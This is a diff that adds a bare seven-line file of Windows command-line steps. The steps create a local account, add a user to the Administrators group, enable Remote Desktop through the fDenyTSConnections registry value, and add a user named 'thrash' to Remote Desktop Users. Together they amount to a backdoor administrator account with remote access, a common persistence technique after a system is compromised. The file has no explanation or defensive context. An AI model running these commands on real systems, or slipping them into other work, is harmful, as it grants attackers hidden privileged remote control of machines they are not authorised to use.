@@ -1,0 +1,7 @@
+net user /add USER PASSWORD
+
+net localgroup administrators USERNAMEGOESHERE /add
+
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+net localgroup "Remote Desktop Users" thrash /add
